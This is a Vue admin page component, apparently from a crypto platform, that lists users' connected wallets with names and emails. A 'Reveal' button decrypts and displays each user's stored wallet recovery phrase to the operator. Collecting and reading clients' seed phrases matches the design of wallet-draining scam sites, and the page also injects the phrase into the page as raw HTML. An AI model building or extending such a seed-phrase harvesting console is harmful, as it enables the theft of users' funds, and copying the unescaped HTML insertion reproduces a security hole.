<script setup>
import { ref, onMounted } from 'vue'
import Swal from 'sweetalert2'
import { KeyRound, Eye, Trash2 } from 'lucide-vue-next'
import api from '@/lib/api'

const loading = ref(true)
const wallets = ref([])

async function load() {
  loading.value = true
  try {
    const { data } = await api.get('/admin/wallet-connect')
    wallets.value = data
  } finally {
    loading.value = false
  }
}
onMounted(load)

async function reveal(w) {
  const confirm = await Swal.fire({
    icon: 'warning', title: `Reveal ${w.userName}'s recovery phrase?`,
    text: 'This decrypts a sensitive secret. Only proceed if there is a legitimate support reason.',
    showCancelButton: true, confirmButtonText: 'Reveal', confirmButtonColor: '#e11d48',
  })
  if (!confirm.isConfirmed) return
  const { data } = await api.post(`/admin/wallet-connect/${w.id}/reveal`)
  Swal.fire({
    icon: 'info', title: 'Recovery Phrase', html: `<code class="text-sm break-words">${data.phrase}</code>`,
    confirmButtonText: 'Close',
  })
}

async function remove(w) {
  const confirm = await Swal.fire({ icon: 'warning', title: `Delete ${w.userName}'s wallet connection?`, showCancelButton: true, confirmButtonText: 'Delete', confirmButtonColor: '#e11d48' })
  if (!confirm.isConfirmed) return
  await api.delete(`/admin/wallet-connect/${w.id}`)
  await load()
}
</script>

<template>
  <div class="p-4 sm:p-6 lg:p-8 space-y-6">
    <div>
      <h1 class="text-2xl font-bold text-slate-900 dark:text-white flex items-center gap-2"><KeyRound class="w-6 h-6 text-indigo-500" /> Client Phrase Keys</h1>
      <p class="text-sm text-slate-500 dark:text-slate-400">{{ wallets.length }} connected wallets — phrases are encrypted at rest</p>
    </div>

    <div v-if="loading" class="text-slate-500 dark:text-slate-400">Loading…</div>
    <div v-else-if="wallets.length === 0" class="text-slate-500 dark:text-slate-400">No wallet connections yet.</div>

    <div v-else class="bg-white dark:bg-[#0F1524] border border-slate-200 dark:border-white/5 rounded-2xl overflow-x-auto">
      <table class="w-full text-sm">
        <thead>
          <tr class="text-left text-slate-500 dark:text-slate-400 border-b border-slate-200 dark:border-white/5">
            <th class="py-3 px-4 font-medium">User</th>
            <th class="py-3 px-4 font-medium">Wallet Name</th>
            <th class="py-3 px-4 font-medium">Status</th>
            <th class="py-3 px-4 font-medium">Connected</th>
            <th class="py-3 px-4 font-medium text-right">Actions</th>
          </tr>
        </thead>
        <tbody>
          <tr v-for="w in wallets" :key="w.id" class="border-b border-slate-100 dark:border-white/5 last:border-0">
            <td class="py-3 px-4">
              <div class="text-slate-900 dark:text-white font-medium">{{ w.userName }}</div>
              <div class="text-xs text-slate-500 dark:text-slate-400">{{ w.userEmail }}</div>
            </td>
            <td class="py-3 px-4 text-slate-700 dark:text-slate-300">{{ w.walletName }}</td>
            <td class="py-3 px-4"><span class="px-2 py-1 rounded-full text-xs font-medium bg-emerald-100 text-emerald-700 dark:bg-emerald-500/10 dark:text-emerald-400">{{ w.status }}</span></td>
            <td class="py-3 px-4 text-slate-500 dark:text-slate-400">{{ new Date(w.createdAt).toLocaleDateString() }}</td>
            <td class="py-3 px-4">
              <div class="flex items-center justify-end gap-1">
                <button class="p-2 text-slate-400 hover:text-indigo-500 hover:bg-indigo-50 dark:hover:bg-white/5 rounded-lg" title="Reveal phrase" @click="reveal(w)"><Eye class="w-4 h-4" /></button>
                <button class="p-2 text-rose-500 hover:bg-rose-50 dark:hover:bg-rose-500/10 rounded-lg" title="Delete" @click="remove(w)"><Trash2 class="w-4 h-4" /></button>
              </div>
            </td>
          </tr>
        </tbody>
      </table>
    </div>
  </div>
</template>
